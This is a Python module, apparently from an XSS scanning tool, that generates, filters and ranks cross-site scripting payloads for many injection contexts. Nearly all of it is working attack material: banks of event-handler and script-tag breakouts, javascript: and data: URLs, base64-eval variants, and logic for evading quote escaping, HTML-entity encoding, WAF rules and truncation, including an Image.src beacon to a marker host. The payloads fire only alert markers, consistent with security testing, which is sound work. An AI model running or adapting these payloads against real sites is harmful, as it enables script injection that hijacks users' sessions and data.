"""Context-aware payload generation with unique execution markers."""

from __future__ import annotations

import html
import re
from typing import Dict, List, Optional

from intellixss.models import CharProbeResult, FilterType, InjectionContext


def make_marker(uid: str) -> str:
    """Unique token carried by every payload so browser confirmation is causal."""
    uid = re.sub(r"[^0-9a-zA-Z]", "", uid or "")[:8] or "00000000"
    return f"ixm{uid.lower()}"


def _mark(marker: str) -> str:
    """PoP binder: calls alert with the marker (survives naive alert(1) filters)."""
    return f"alert('{marker}')"


def _shortcut_call(template: str, marker: str) -> str:
    """Fill a shortcut handler so it survives inside a *quoted attribute*.

    The attribute's own delimiters are already spent, so every quote inside the
    handler would end it. The call is therefore written with backticks, and the
    two outermost quotes of the template are left as the delimiters.
    """
    return template.replace("A", f"alert(`{marker}`)")


def _is_alert_noise(pl: str) -> bool:
    """True for payloads that are only alert-looking text, not structural XSS."""
    pl = pl.lower()
    if re.search(r"\bon[a-z]+\s*=", pl):
        return False
    if "<" in pl or "javascript:" in pl:
        return False
    if re.search(r"""['"]\s*\)\s*;""", pl):  # JS breakout
        return False
    # A quote behind a backslash closes a JS literal once the app has added its
    # own escape to that backslash.
    if re.search(r"""\\+["']""", pl):
        return False
    # An image whose ``src`` carries the marker is an execution primitive: the
    # request proves the code ran, and it needs no ``alert`` or backtick.
    if re.search(r"\.src\s*=", pl) or re.search(r"\bimport\s*\(", pl):
        return False
    return bool(re.search(r"alert\s*(\(|`)", pl))


def _mark_unquoted(marker: str) -> str:
    """Call alert with the marker built without a single quote character.

    A server that escapes quotes writes ``'`` as ``\\u0027``; inside a template
    interpolation that escape is not re-read as a quote, so the call silently
    never fires. ``String.fromCharCode`` produces the same marker from numbers,
    which no quote filter can see — measured on a lab that blocks quotes and
    both brackets yet executes an interpolation carrying no literal.
    """
    codes = ",".join(str(ord(c)) for c in marker)
    return f"alert(String.fromCharCode({codes}))"


def _templ(template: str, marker: str, quote: str = "") -> str:
    """Fill a payload template: M→marker, Q→quote char, PO→_mark, PQ→unquoted.

    ``PQ`` is the variant for contexts where a quote cannot survive at all:
    the call carries the same marker but is assembled from character codes.
    """
    a = _mark(marker)
    out = (
        template.replace("PO", a)
        .replace("PQ", _mark_unquoted(marker))
        .replace("M", marker)
        .replace("A", a)
    )
    if quote:
        out = out.replace("Q", quote)
    else:
        out = out.replace("Q", '"')
    return _expand_b64_placeholder(out, marker)


# ---------------------------------------------------------------------------
# Template banks (markers: M = marker token, PO = alert('marker'),
# Q = quote char, A = alert call)
# ---------------------------------------------------------------------------

_HTML_TEXT = [
    "<img src=x onerror=PO>",
    "<svg/onload=PO>",
    "<script>PO</script>",
    "<details open ontoggle=PO>",
    "<body onpageshow=PO>",
    "<img src=x onpointerover=PO>",
    "<xss autofocus onfocus=PO tabindex=1>",
    "<iframe srcdoc=\"<script>PO</script>\">",
]

_ATTR_DOUBLE = [
    'Q onmouseover=PO x="',
    'Q autofocus onfocus=PO x="',
    # Breakout stays inside the tag: only usable when "<" is not encoded, but
    # it is the shortest path when it is free, so it keeps its rank.
    'Q><img src=x onerror=PO>',
    'Q><svg/onload=PO>',
    'Q><script>PO</script>',
    'Q><iframe srcdoc="<script>PO</script>">',
    # Tag-less fallbacks. With "<" encoded there is no way to open an element,
    # so the injection has to add a handler on the element being injected into
    # and make the browser fire it. Several events are listed because which one
    # the browser can deliver depends on the element (an <input> takes focus,
    # a static block never gets a mouseover).
    'Q onanimationstart=PO x="',
    'Q onpointerenter=PO x="',
    'Q onfocus=PO autofocus x="',
    'Q onblur=PO autofocus x="',
    'Q onclick=PO x="',
    'Q onmouseenter=PO x="',
    'Q ondblclick=PO x="',
    'Q oncopy=PO x="',
    'Q onpaste=PO x="',
    'Q onauxclick=PO x="',
    # Attribute swap: reuse the element as a navigation sink instead of a
    # handler. ``href``/``src`` on the injected tag execute ``javascript:``
    # without needing "<" at all, provided the page follows the URL.
    'Q x=" autofocus onfocus=PO autofocus="',
]

_ATTR_SINGLE = [
    "Q onmouseover=PO x='",
    "Q autofocus onfocus=PO x='",
    "Q><img src=x onerror=PO>",
    "Q><svg/onload=PO>",
    "Q><script>PO</script>",
    # Tag-less fallbacks mirroring the double-quoted set.
    "Q onanimationstart=PO x='",
    "Q onpointerenter=PO x='",
    "Q onfocus=PO autofocus x='",
    "Q onblur=PO autofocus x='",
    "Q onclick=PO x='",
    "Q onmouseenter=PO x='",
    "Q ondblclick=PO x='",
    "Q oncopy=PO x='",
    "Q onpaste=PO x='",
    "Q onauxclick=PO x='",
]

_ATTR_UNQUOTED = [
    " onmouseover=PO ",
    " onfocus=PO autofocus ",
    " onanimationstart=PO ",
    " onpointerenter=PO ",
    " onclick=PO ",
    " ondblclick=PO ",
    "><img src=x onerror=PO>",
    "><svg/onload=PO>",
    "><script>PO</script>",
]

_HREF = [
    "javascript:PO",
    "javascript:PO//",
    "java\tscript:PO",
    "data:text/html,<script>PO</script>",
    "javascript:eval(atob('BASE64_PLACEHOLDER'))",
    # A URL attribute is normally a link the user follows, and ``javascript:``
    # is the way in. But the element is not always clickable — the canonical
    # link, a preload, a stylesheet — while the value still sits inside a
    # quoted attribute on it. Leaving the URL and declaring a shortcut on that
    # element reaches the same interpreter through an input event. The
    # shortcut spells the call itself: ``_templ`` would insert ``alert('…')``
    # and that pair of quotes would close the attribute again.
    "Qaccesskey=QxQonclick=_SHORTCUT_",
]


def _href_shortcut(template: str, marker: str, quote: str) -> str:
    """Fill a shortcut handler declared on the element owning a URL attribute.

    The attribute's delimiters are already spent, so the handler is called with
    backticks — an ``alert('…')`` would end the attribute right there.
    """
    return template.replace("_SHORTCUT_", f"alert(`{marker}`)").replace("Q", quote)


def _href_follows_code(payload: str) -> bool:
    """True when a URL attribute's new value is a scheme the browser executes."""
    return bool(re.match(r"\s*(?:javascript|data):", payload, re.I))

_TAG = "<img src=x onerror=PO>"
_TAG2 = "<svg/onload=PO>"

_JS_IN_ATTR = [
    "A",
    "1;PO",
    "1;'+-+PO+-+'",
    "Q;PO//",
    "Q);PO//",
    "Q);PO;Q",
    "\\Q;PO//",
    # The expression form: keeps the surrounding literal numeric argument
    # valid and adds a side effect with ``||``. It needs no closing
    # parenthesis, so it survives servers that truncate at the first ``)``
    # (and defeats chained handlers such as ``parseInt(x)||3``).
    "1Q||PO||Q",
    "1Q&&PO&&Q",
    # The comma form: turns the literal argument into the first of a comma
    # expression, so the surrounding call stays valid and our code runs
    # alongside it. Nothing is commented out, so it survives servers that
    # strip everything after ``//`` or before ``)``.
    "1Q,PO,Q",
    "1Q,PO",
    # Handler attribute without quotes: the value ends at whitespace, so the
    # reflection is raw JS and needs no breakout at all.
    "PO",
    "1;PO//",
]


def _js_attr_breakouts(quote: str) -> List[str]:
    """Close the JS string, close the *attribute*, then open a real element.

    Inside a live ``onload`` handler, ``');alert(1)//`` is valid JS but the
    attribute is parsed before any script runs: the delimiter stays swallowed
    and the handler never parses. The breakout must therefore end the
    attribute and inject a tag whose own handler fires.
    """
    q = quote or '"'
    close = f"1{q}>{_TAG}"
    # Keep the JS syntactically tolerated on the way out.
    return [close, f"1{q} {_TAG} x={q}", f"{close}{_TAG2}"]

_JS_DOUBLE = [
    '";PO;//',
    '";PO//',
    '"-PO-"',
    '</script><img src=x onerror=PO>',
]

_JS_SINGLE = [
    "';PO;//",
    "';PO//",
    "'-PO-'",
    # The quote is escaped, so the escape itself is the breakout: the app
    # prefixes its own backslash to the quote *after* copying the value, so a
    # value that already ends in one becomes ``\\'`` — an even run, which is a
    # literal backslash followed by a real end-of-string. With the literal
    # closed, the rest of the payload is code, and it is written without any
    # quote so the app has nothing left to escape. ``new Image`` needs no
    # ``alert``, no ``<``, no ``>`` and no backtick: the request to the marker
    # host is the proof, and it survives a page that encodes every one of them.
    "\\';x=new Image;x.src=`//M.ixm.example/x`//",
    "\\'-x=1,x-",
    "</script><img src=x onerror=PO>",
]

_JS_CODE = [
    "PO",
    "';PO//",
    "</script><svg/onload=PO>",
    "PO//",
]

_JS_TEMPLATE = [
    "${PO}",
    # The marker cannot be quoted here: a server that escapes the apostrophe
    # writes it as ``\u0027`` and the interpolation then fails to evaluate, while
    # a call that assembles the string from character codes runs untouched.
    # Measured on a lab that blocks quotes and brackets yet executes an
    # interpolation carrying no literal at all.
    "${PQ}",
    "`;PO//",
    "</script><img src=x onerror=PO>",
]

_TEXTAREA = [
    "</textarea><img src=x onerror=PO>",
    "</textarea><svg/onload=PO>",
    "</textarea><script>PO</script>",
]

_TITLE = [
    "</title><img src=x onerror=PO>",
    "</title><script>PO</script>",
]

_COMMENT = [
    "--><img src=x onerror=PO>",
    "--><script>PO</script>",
    "--!><img src=x onerror=PO>",
]

_CSS = [
    "</style><img src=x onerror=PO>",
    "expression(PO)",
    "url(javascript:PO)",
]

_JSON = [
    '","x":"<img src=x onerror=PO>',
    "\\u003cimg src=x onerror=PO\\u003e",
    "x</script><img src=x onerror=PO>",
]

_FRAGMENT = [
    "1' onerror='PO",
    "1 onerror=PO ",
    "1'><img src=x onerror=PO>",
    '1"><img src=x onerror=PO>',
    "1<img src=x onerror=PO>",
]

_UNIVERSAL = [
    "<img src=x onerror=PO>",
    "<svg/onload=PO>",
    '<"><img src=x onerror=PO>',
    "<details open ontoggle=PO>",
    "<script>PO</script>",
]

_BANK = {
    InjectionContext.HTML_TEXT: _HTML_TEXT,
    InjectionContext.HTML_ATTR_DOUBLE: _ATTR_DOUBLE,
    InjectionContext.HTML_ATTR_SINGLE: _ATTR_SINGLE,
    InjectionContext.HTML_ATTR_UNQUOTED: _ATTR_UNQUOTED,
    InjectionContext.HTML_ATTR_HREF: _HREF,
    InjectionContext.JS_STRING_DOUBLE: _JS_DOUBLE,
    InjectionContext.JS_STRING_SINGLE: _JS_SINGLE,
    InjectionContext.JS_CODE: _JS_CODE,
    InjectionContext.JS_TEMPLATE: _JS_TEMPLATE,
    InjectionContext.JS_IN_ATTR: _JS_IN_ATTR,
    InjectionContext.TEXTAREA: _TEXTAREA,
    InjectionContext.TITLE: _TITLE,
    InjectionContext.HTML_COMMENT: _COMMENT,
    InjectionContext.CSS_VALUE: _CSS,
    InjectionContext.JSON_VALUE: _JSON,
    InjectionContext.URL_FRAGMENT: _FRAGMENT,
    InjectionContext.SCRIPT_TAG: _JS_CODE,
    InjectionContext.UNKNOWN: _UNIVERSAL,
}


def generate_payloads(
    context: InjectionContext,
    filters: Optional[List[FilterType]] = None,
    char_probe: Optional[CharProbeResult] = None,
    aggressive: bool = False,
    limit: int = 40,
    marker: str = "",
    quote_char: str = "",
    waf_payloads: Optional[List[str]] = None,
    encoding_level: int = 0,
) -> List[str]:
    """
    Return an ordered list of payloads for *context*.

    Parameters
    ----------
    marker
        Unique token embedded in every payload (``ixm1a2b3c4``). Enables
        causal browser confirmation instead of "some dialog fired".
    quote_char
        Actual quote character detected by the context analyser ('"' or "'"),
        used to fill ``Q`` in templates. Defaults to the context's natural one.
    waf_payloads
        Extra payloads selected by a WAF profile.
    encoding_level
        Rewrite templates for a server that decodes input *n* times.
    """
    filters = filters or []
    marker = marker or make_marker("0" * 8)
    quote = quote_char or ('"' if context != InjectionContext.HTML_ATTR_SINGLE else "'")

    templates = list(_BANK.get(context, _UNIVERSAL))

    # Context mixing: only where it cannot cause early-stop false positives.
    if context in (
        InjectionContext.HTML_TEXT,
        InjectionContext.UNKNOWN,
        InjectionContext.TEXTAREA,
        InjectionContext.TITLE,
        InjectionContext.HTML_COMMENT,
    ):
        templates.extend(_UNIVERSAL)

    if FilterType.STRIP_SCRIPT in filters:
        templates = [t for t in templates if "<script" not in t.lower()] + [
            "<img src=x onerror=PO>",
            "<svg/onload=PO>",
            "<details open ontoggle=PO>",
        ]

    if context == InjectionContext.JS_IN_ATTR:
        # A handler attribute is parsed before any script in it runs, so a JS
        # string breakout alone never fires: the attribute has to be closed.
        templates = _js_attr_breakouts(quote) + templates

    if context in (
        InjectionContext.HTML_ATTR_SINGLE,
        InjectionContext.HTML_ATTR_DOUBLE,
    ):
        # The value is inside a quoted attribute and the page has not closed
        # it. Two things follow. First, a form that needs the *other* quote
        # (``' onmouseover='alert(1)``) lives or dies on whether that character
        # survives, so a form built from the surviving set is offered first.
        # Second, a handler on an element nobody hovers still needs a way in. The
        # canonical link tag proves why that has to be an input *event*: a
        # ``<link>`` is never rendered and is never focusable, so it can only be
        # reached through a shortcut the browser binds to whatever carries the
        # ``accesskey`` — and the click that shortcut synthesises cannot be
        # reproduced by dispatching a DOM event.
        live = set(char_probe.allowed_chars) if char_probe else set()
        q = quote or ("'" if context == InjectionContext.HTML_ATTR_SINGLE else '"')
        other = '"' if q == "'" else "'"
        shortcut: List[str] = []
        for close, keep in ((q, other), (other, q)):
            if not live or (close in live and keep in live):
                shortcut.append(f"{close}accesskey={keep}x{keep}onclick=A")
        # The backtick handler spends no quote beyond the delimiters.
        shortcut.append(f"{q}accesskey={q}x{q}onclick=A")
        templates = shortcut + templates + [
            f"{q}onfocus=A autofocus x={q}",
            f"{q}ontoggle=A popover x={q}",
        ]

    if context in (
        InjectionContext.JS_STRING_SINGLE,
        InjectionContext.JS_STRING_DOUBLE,
    ):
        # A quote that the server backslash-escapes can only be reopened by
        # ending the script block, because ``</script>`` is not a JS token and
        # the parser stops the script there. What is left of the page's own
        # statement (``';``) then has to be swallowed, and the generated markup
        # has to be legal without a raw ``>`` when that character was not among
        # the survivors. Both forms are offered; the browser rejects the one
        # that does not fit.
        live = set(char_probe.allowed_chars) if char_probe else set()
        tail = "//" if ("/" in live or not live) else ""
        # A server that escapes ``>`` leaves no way to close the tag we open,
        # so the handler is left open and the parser closes it at the end of
        # the document. The backtick argument needs no escaping against the
        # page's own tail (``';``), unlike ``alert('…')``.
        templates.insert(0, "</script><img src=x onerror=alert(`M`)%s" % tail)
        if ">" in live or not live:
            templates.insert(0, "</script><img src=x onerror=A>//")

    payloads = [
        _href_shortcut(t, marker, quote)
        if ("accesskey=" in t and context == InjectionContext.HTML_ATTR_HREF)
        else _templ(t, marker, quote)
        for t in templates
    ]

    # Base64 obfuscation for href / JS contexts (no literal 'alert' keyword)
    if context in (InjectionContext.HTML_ATTR_HREF, InjectionContext.JS_CODE, InjectionContext.HTML_TEXT):
        payloads.extend(_b64_variants(marker))

    # WAF playbook entries (rewritten with our marker)
    for wp in waf_payloads or []:
        payloads.append(_templ(wp, marker, quote) if "alert(1)" in wp else wp)

    payloads = _dedupe(payloads)

    # Character-survival filtering (keeps payloads that can still work)
    if char_probe and char_probe.reflected:
        payloads = _entity_recover(payloads, char_probe, marker, quote)
        payloads = _char_filter(payloads, char_probe, marker, context)

    if encoding_level > 0:
        from intellixss.encode import encode_value

        payloads = _dedupe([encode_value(p, encoding_level) for p in payloads])

    return _rank(payloads, context, aggressive, marker)[:limit]


def _b64_variants(marker: str) -> List[str]:
    import base64

    src = f"alert('{marker}')"
    b64 = base64.b64encode(src.encode()).decode()
    return [
        f"eval(atob('{b64}'))",
    ]


_B64_PLACEHOLDER = "BASE64_PLACEHOLDER"


def _expand_b64_placeholder(p: str, marker: str) -> str:
    if _B64_PLACEHOLDER not in p:
        return p
    import base64

    return p.replace(_B64_PLACEHOLDER, base64.b64encode(f"alert('{marker}')".encode()).decode())


def _entity_recover(
    payloads: List[str], probe: CharProbeResult, marker: str = "", quote: str = "'"
) -> List[str]:
    """Build payload variants for characters the app HTML-encodes.

    When the probe shows ``'`` reflected as ``&#39;``, the app is *encoding*
    rather than stripping. In HTML-attribute JS contexts the browser decodes
    entities before the handler runs, so a prompt that already contains the
    entity is the working payload — sending the raw quote only gets
    double-encoded. These variants go first because they are proven against
    the measured behaviour of this exact parameter.
    """
    encoded = probe.encoded_chars
    if not encoded:
        return payloads

    token = marker or "EVENTMARK"
    recovered: List[str] = []

    # The two matching strategies depend on *how* the app encodes:
    #
    # * attribute-attribute noise (``'`` → ``&#39;`` while the rest passes):
    #   the app encodes the raw character for us, so *strip* the characters it
    #   refuses to pass through verbatim and let the encoder supply them.
    # * negative-based encoding (a ``'``-stop leak: ``3');alert(1)//`` is
    #   truncated, ``3&#39;);alert(1)//`` passes): sending the entity form is
    #   what gets decoded into the breakout. Applies to script bodies too,
    #   where double-encoded entities would otherwise never be decoded.
    entity_forms: Dict[str, str] = {}
    for ch, form in encoded.items():
        form = form.strip()
        if not form.startswith("&") or not form.endswith(";"):
            form = html.escape(ch)
        entity_forms[ch] = form

    # Sending the entity form only helps when the app does NOT re-encode raw
    # characters. If it does (``'`` → ``&#39;`` into an attribute), sending
    # ``&#39;`` just gets double-encoded and the raw character is what the
    # browser ends up decoding.
    use_entities = any(form != html.escape(ch) for ch, form in entity_forms.items())

    for prompt in ("1;PO", "1'+PO+'", "Q);PO//", "1' Q PO Q"):
        raw = prompt.replace("PO", f"alert('{token}')").replace("Q", quote)
        stripped = raw
        for ch in encoded:
            # The app encodes the raw character for us, so strip it and let
            # its own encoder put it back (attribute-attribute noise).
            stripped = stripped.replace(ch, "")
        if stripped != raw:
            recovered.append(stripped)
        if use_entities:
            as_entity = raw
            for ch, form in entity_forms.items():
                as_entity = as_entity.replace(ch, form)
            if as_entity != raw:
                recovered.append(as_entity)

    if not recovered:
        return payloads
    return _dedupe(recovered) + payloads


def _is_expression_breakout(p: str) -> bool:
    """True for payloads that extend the surrounding expression in place.

    Two shapes qualify:

    * ``1'||alert(1)||'`` — short-circuits, so it needs no closing ``)``;
    * ``1',alert(1),'`` — the comma operator, so the enclosing call stays
      valid and runs our code beside it.

    Both contain a quote only because the page's own encoder supplies it, so a
    quote filter must not discard them.
    """
    if re.search(r"""(?:\|\||&&)\s*(?:alert|prompt|confirm)\s*(?:\(|`)""", p, re.I):
        return True
    return bool(
        re.search(
            r"""["']\s*,\s*(?:alert|prompt|confirm)\s*(?:\(|`)""", p, re.I
        )
    )


def _is_breakout(p: str) -> bool:
    """True when *p* closes the surrounding construct and opens a new element.

    Such a payload deliberately contains a quote followed by ``>``; filtering
    it on quote presence would discard the only form that runs in a handler.

    A ``</script>`` escape counts even when the tag it opens has no ``>``: the
    script block ends at that token regardless of the JS string the server
    escaped, and the rest of the document supplies the closing bracket.

    A backslash before a quote counts too. The app escapes the quote by
    prefixing a backslash *after* copying the user's own characters, so a value
    that ends in one backslash produces ````\\'```` — an even run, which the JS
    parser reads as a literal backslash and then a real quote.

    A marker-carrying image counts as well: ``x.src=…`` runs code and its own
    quotes and backticks belong to the statement, not to the page's delimiter,
    and the request it makes is what proves execution.
    """
    return bool(
        re.search(
            r"""["']\s*>|</script|<img|<svg|<details|<script|\\["']"""
            r"""|\.src\s*=|\bimport\s*\(""",
            p,
            re.I,
        )
    )


def _is_url_script(p: str) -> bool:
    """True for ``javascript:`` / ``data:`` URLs that run code.

    The quotes and angle brackets in these belong to the payload's own script
    body or markup, not to the attribute delimiter the page used, so a
    character filter that encodes ``'`` must not discard them.
    """
    return bool(re.match(r"\s*(?:javascript|data):", p, re.I))


_MARKUP_ATTR_CONTEXTS = frozenset(
    {
        InjectionContext.HTML_ATTR_DOUBLE,
        InjectionContext.HTML_ATTR_SINGLE,
        InjectionContext.HTML_ATTR_UNQUOTED,
    }
)


def _stays_inside_tag(p: str) -> bool:
    """True if the payload changes what the enclosing *tag* does.

    Either it adds an event-handler attribute to the element the value belongs
    to, or it closes the tag so subsequent markup is parsed as elements. A bare
    JS breakout does neither and is inert in an attribute value.
    """
    return bool(
        re.search(r"""["']?\s*[a-zA-Z-]+\s*=\s*(?:alert|prompt|confirm|PO)""", p, re.I)
        or re.search(r"""["']\s*>""", p)
    )


def _char_filter(
    payloads: List[str],
    probe: CharProbeResult,
    marker: str,
    context: Optional[InjectionContext] = None,
) -> List[str]:
    """Drop payloads that need characters the app provably strips/encodes."""
    problem = set(probe.blocked_chars) | set(probe.encoded_chars.keys())
    # In JS-string contexts the browser decodes HTML entities *before* the
    # handler runs, so an entity form of a quote is a usable payload even
    # though the app "encodes" that quote — it is not a dead character.
    entity_ok = bool(probe.encoded_chars) and not probe.blocked_chars
    if not problem:
        return payloads
    kept: List[str] = []
    for p in payloads:
        if (
            context in _MARKUP_ATTR_CONTEXTS
            and (("<" in problem and "<" in p) or (">" in problem and ">" in p))
        ):
            # An encoded "<" arrives as "&lt;" and the parser reads it as text,
            # so any payload that opens a new element is dead regardless of how
            # well it breaks out of the current construct. URL attributes are
            # excluded: there the record is decoded again before it is followed,
            # so a ``data:`` payload keeps working with "<" encoded.
            continue
        if "</script" in p.lower() and "<" in probe.allowed_chars:
            # Ending the script block is a parser-level escape: it does not
            # depend on a quote surviving, so a payload carrying it is kept even
            # when the ``>`` that would close its tag did not.
            kept.append(p)
            continue
        if _is_breakout(p) or _is_expression_breakout(p):
            # A payload that closes the current construct and opens a new
            # element is exactly what a handler attribute needs; a quote in it
            # is consumed by the HTML parser, not by the app's filter.
            kept.append(p)
            continue
        if "atob" in p or "fromCharCode" in p or "&#" in p:
            kept.append(p)
            continue
        if _is_url_script(p):
            # In an href/src value the quote is inside a script URL, not the
            # attribute delimiter: the app encoding it as ``&#39;`` does not
            # disable it, because a URL attribute's value is decoded before the
            # browser decides what it is.
            kept.append(p)
            continue
        if entity_ok and re.search(r"&#\d+;", p):
            kept.append(p)
            continue
        if context in _MARKUP_ATTR_CONTEXTS and not _stays_inside_tag(p):
            # Inside an attribute value, closing the quote does nothing unless
            # the tag itself is then closed as well or a new attribute is
            # introduced. A JS breakout such as ``");alert(1)//`` is valid in a
            # handler or a script body, but in an attribute it is only text:
            # the parser never leaves the tag, so nothing executes.
            continue
        if re.search(r"\$\{[^}]*\}", p):
            # Template interpolation runs in place inside the literal: it never
            # closes a quote and never opens a tag, so a filter that kills the
            # quote and both brackets still leaves it executable. Judging it by
            # characters it does not need discarded the one payload that works.
            kept.append(p)
            continue
        if "'" in problem and "'" in p:
            continue
        if ("<" in problem or ">" in problem) and ("<" in p or ">" in p):
            # await fallback to handler-only breakouts
            if p.lstrip().startswith(('"', "'")):
                kept.append(p)
            continue
        if '"' in problem and '"' in p and "onerror" not in p:
            continue
        kept.append(p)
    # Always retain an eval/atob fallback when something is blocked
    if problem and not any("atob" in k for k in kept):
        kept.append(_b64_variants(marker)[0])
    return kept or [_b64_variants(marker)[0]]


def _rank(
    payloads: List[str], context: InjectionContext, aggressive: bool, marker: str
) -> List[str]:
    def score(p: str) -> tuple:
        pl = p.lower()
        s = 0
        if marker not in p:
            s += 200  # prefer payloads carrying the execution proof
        if "alert(" in pl or "alert`" in pl:
            s -= 20
        if re.search(r"aLeRt|AlErT|ALERT\(", p):
            s += 40
        if _is_alert_noise(pl):
            s += 150
        if context in (InjectionContext.HTML_ATTR_DOUBLE, InjectionContext.HTML_ATTR_SINGLE):
            if re.search(r"""["']\s*on[a-z]+\s*=""", pl) or re.search(r"""["']\s*>""", pl):
                s -= 100
            if pl.startswith("<"):
                s += 80
        if context in _MARKUP_ATTR_CONTEXTS and "on" in pl:
            # Handler-only payloads differ by whether the browser fires them
            # without a human. Focus and animation events run on load (the
            # input gets focus, a fresh animation starts); hover, click and
            # copy need a real user gesture, which an automated visit never
            # supplies. Order by that, not alphabetically.
            if re.search(r"""onfocus\s*=""", pl) and "autofocus" in pl:
                s -= 160
            elif re.search(r"""onblur\s*=""", pl) and "autofocus" in pl:
                s -= 150
            elif re.search(r"""on(?:animationstart|transitionend)\s*=""", pl):
                s -= 145
            elif re.search(r"""on(?:pointerenter|mouseover|mouseenter)\s*=""", pl):
                s -= 120
            elif re.search(r"""on(?:click|auxclick|dblclick|copy|paste)\s*=""", pl):
                s -= 60
        if context == InjectionContext.HTML_ATTR_HREF:
            if pl.startswith("javascript:"):
                s -= 100
            if "alert" in pl and "javascript:" not in pl:
                s += 80
            if "accesskey" in pl:
                # A URL attribute is a scheme the browser is asked to follow,
                # and a hijacked scheme only runs once the link is clicked — a
                # canonical link, a preload and a stylesheet never are. Declaring
                # a shortcut on the element that owns the attribute leaves the
                # URL grammar entirely and reaches the handler through an input
                # event, so it is the stronger form here.
                s -= 220
        if context == InjectionContext.HTML_ATTR_UNQUOTED:
            if re.search(r"^\s*on[a-z]+\s*=", pl):
                s -= 100
            if pl.lstrip().startswith("><"):
                s -= 70
        if context == InjectionContext.JS_IN_ATTR:
            if re.search(r"""["']\s*,\s*(?:alert|prompt|confirm)\s*\([^)]*\)\s*,\s*["']""", p):
                # Comma expression that re-opens the literal. This is the form
                # verified to fire inside a parameterised call such as
                # ``startTimer('…')``: the call stays valid and our code runs
                # beside it, so a stripped comment or a truncating server does
                # not disable the handler.
                s -= 195
            elif re.search(r"""["']\s*,\s*(?:alert|prompt|confirm)\s*\(|["']\s*,\s*PO""", p):
                # Same idea without the trailing literal: shorter, but leaves
                # the enclosing call one argument short.
                s -= 185
            elif re.search(r"(?:\|\||&&)\s*alert", p):
                # Needs no closing parenthesis: works inside parameterised
                # handlers (``parseInt(x)||3``) and survives servers that
                # truncate at ``)``.
                s -= 170
            elif _is_breakout(p):
                # A handler attribute is parsed before any script runs, so
                # closing it and opening a new element is the only form that
                # fires; rank it above raw JS breakouts.
                s -= 140
            elif ");alert" in pl or "');alert" in pl:
                s -= 50
        if context in (InjectionContext.HTML_TEXT, InjectionContext.UNKNOWN):
            if any(t in pl for t in ("<script", "onerror", "onload", "<svg")):
                s -= 50
        if not aggressive:
            s += min(len(p), 80)
        return (s, len(p), p)

    return sorted(_dedupe(payloads), key=score)


def _dedupe(items: List[str]) -> List[str]:
    seen = set()
    out = []
    for i in items:
        if i and i not in seen:
            seen.add(i)
            out.append(i)
    return out
